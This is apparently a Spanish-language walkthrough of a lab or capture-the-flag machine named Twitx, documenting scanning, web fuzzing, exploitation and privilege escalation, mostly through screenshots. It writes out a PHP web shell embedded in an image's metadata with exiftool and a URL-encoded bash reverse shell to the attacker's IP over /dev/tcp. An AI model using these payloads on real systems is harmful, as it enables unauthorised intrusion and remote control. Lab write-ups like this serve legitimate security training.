# Máquina Twitx

### Reconocimiento de la Ip de la máquina víctima

![alt text](image-2.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.140

![alt text](image.png)

### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.5.140

![alt text](image-1.png)


### Fuzing web

feroxbuster --url http://192.168.5.140 -w /usr/share/seclists/Discovery/Web-Content/big.txt

![alt text](image-3.png)

Entré a http://192.168.5.140/note

![alt text](image-4.png)

lo coloqué en el /etc/hosts

![alt text](image-5.png)

entramos en la web

![alt text](image-6.png)

al inspeccionar la web:

![alt text](image-7.png)

### Explotación

Me registré:

![alt text](image-8.png)

Para subir una imagen

primero creamos una imagen en blanco.

convert -size 150x150 xc:white jorge.png

luego cargamos la web shell cmd en la imagen jorge.png

exiftool -comment='<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' jorge.png

al hacer el cambio en la variable dateFinish

![alt text](image-9.png)

Iniciamos sesión con la cuenta que me he registrado

![alt text](image-10.png)

de esta manera hacemos uso de la web shell:

![alt text](image-11.png)

rev shell bash en urlencoded:

bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.5.131%2F443%200%3E%261%27

![alt text](image-12.png)

![alt text](image-13.png)

ejecuté la herramienta pspy64:

![alt text](image-14.png)

verifiqué los permisos:

![alt text](image-15.png)

agregué una línea de código al archivo taak.php

![alt text](image-16.png)

me puse en escucha en el puerto 4444

![alt text](image-17.png)

![alt text](image-18.png)

![alt text](image-19.png)

cambiando al usuario lenam

usando la herramienta RSAcrack para ver el passphrase

![alt text](image-20.png)

![alt text](image-21.png)

### Escalar privilegios

usando la herramientas linpeas.sh

![alt text](image-22.png)

![alt text](image-23.png)

### user.txt

![alt text](image-25.png)

### root.txt

![alt text](image-24.png)